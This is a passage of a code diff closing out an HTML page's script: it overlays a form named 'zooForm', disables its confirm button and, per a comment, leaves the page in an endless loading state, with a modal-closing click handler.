+                zooForm.style.position = 'relative';
+                zooForm.appendChild(overlayDiv);
+            }
+            
+            // Submit-Button deaktivieren um mehrfaches Absenden zu verhindern
+            document.getElementById('confirmBtn').disabled = true;
+            
+            // ENDELØS LOADING - Seite bleibt offen mit sichtbarem Formular im Hintergrund
+        }
+        
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+    </script>
+</body>
+</html>
